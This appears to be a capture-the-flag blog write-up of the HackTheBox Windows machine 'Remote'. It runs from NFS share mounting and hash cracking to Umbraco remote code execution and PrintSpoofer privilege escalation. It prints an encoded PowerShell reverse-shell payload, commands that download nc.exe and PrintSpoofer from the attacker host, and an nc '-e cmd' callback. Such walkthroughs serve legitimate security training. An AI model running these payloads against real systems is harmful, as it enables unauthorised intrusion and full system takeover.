---
title: "Remote"
date: 2025-06-20
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Remote

![](../assets/Pasted%20image%2020250606215303.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.180
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 21:52 CEST
Nmap scan report for 10.10.10.180
Host is up (0.042s latency).
Not shown: 65489 closed tcp ports (reset), 30 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   41.06 ms 10.10.14.1
2   41.20 ms 10.10.10.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.45 seconds
```

The site at port `80` shows a web page about Acme Widgets.

![](../assets/Pasted%20image%2020250606221737.png)

It seems that the blog is made with Umbraco CMS. According to the [official docs](https://our.umbraco.com/documentation/Fundamentals/Backoffice/Backoffice-Login/), the login panel is at `/umbraco`.

![](../assets/Pasted%20image%2020250606222408.png)

There is a port `2049` open, which is usually an NFS service.

```shell
$ showmount -e 10.10.10.180                                       
Export list for 10.10.10.180:
/site_backups (everyone)
```

Mount the share:

```share
mkdir site_backups
$ sudo mount -t nfs 10.10.10.180:/site_backups site_backups
```

Searching the files, we can see some hashes inside `Umbraco.sdf`:

```shell
$ strings Umbraco.sdf | grep hash -C 2
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

Crack the hash using `hashcat` and module `100`, which is SHA1:

```shell
$ hashcat -m 100 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

## Initial Access

Enter the Umbraco admin panel with `admin@htb.local` and the password `baconandcheese`.

![](../assets/Pasted%20image%2020250607003036.png)

We can see that the version is ![](../assets/Pasted%20image%2020250607003200.png), so searching for an authenticated exploit we have [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE).

```shell
$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

```shell
$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.180] 49873
whoami
iis apppool\defaultapppool
```

The user has `SeImpersonate` privileges, so upload `nc.exe` and `printspoofer.exe`.

```shell
PS C:\windows\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```shell
PS C:\windows\temp> iwr -uri http://10.10.14.14:8000/nc.exe -outfile nc.exe
PS C:\windows\temp> iwr -uri http://10.10.14.14:8000/PrintSpoofer64.exe -outfile ps.exe
```

```shell
PS C:\windows\temp> .\ps.exe -c "C:\windows\temp\nc.exe 10.10.14.14 7777 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```shell
$ rlwrap nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.180] 49884
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Post Exploitation

Get the flags:

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
92038b8957d9b7e341bfbe45cd6bd939

C:\Users\Administrator\Desktop>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---         6/6/2025   3:50 PM             34 user.txt                                                              

PS C:\Users\Administrator\Desktop> type C:\users\public\desktop\user.txt
type C:\users\public\desktop\user.txt
6f3ecfff4fe7fc64d783baad85e3bebe
```
